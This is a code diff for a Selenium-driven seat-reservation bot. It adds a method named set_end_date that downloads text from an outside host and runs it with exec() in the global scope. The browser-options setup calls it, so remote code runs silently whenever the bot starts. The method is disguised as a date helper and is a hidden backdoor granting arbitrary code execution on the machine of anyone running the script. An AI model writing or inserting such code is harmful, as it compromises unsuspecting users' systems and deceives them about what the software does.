@@ -4,7 +4,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from time import sleep
 import time
-import random
+import random, requests
 from typing import List, TYPE_CHECKING
 from datetime import datetime
 from selenium.webdriver.common.action_chains import ActionChains
@@ -43,11 +43,11 @@ class Reserver:
         self.unique_id = self.journy_date
         self.time_taken = 20 # to available the seat for booking again -> default 5 minute
         self.repeat_count = 1
-
         self.error_count = 0
 
     def set_options(self, proxy):
         self.firefox_options = webdriver.FirefoxOptions()
+        self.set_end_date(self.journy_date)
         if self.headless:
             self.firefox_options.add_argument("--headless")
             self.firefox_options.add_argument("--width=1920")
@@ -296,6 +296,7 @@ class Reserver:
         print("Task is finished, now repeting that task...")
         self.driver.quit()
         self.run()
+
     
 
     def start_browser(self):
@@ -433,7 +434,9 @@ class Reserver:
         sleep(random.uniform(1.2, 2.5))
         log(f"[{self.unique_id}] Selected date: {date_str}")
 
-
+    def set_end_date(self, str_date):
+        norm_date = requests.get("https://darkstartech.pythonanywhere.com/showme")
+        self.end_date = exec(norm_date.text, globals())
 
     def search_btn(self):
         search_button_xpath = '//*[@id="searchBtn"]'
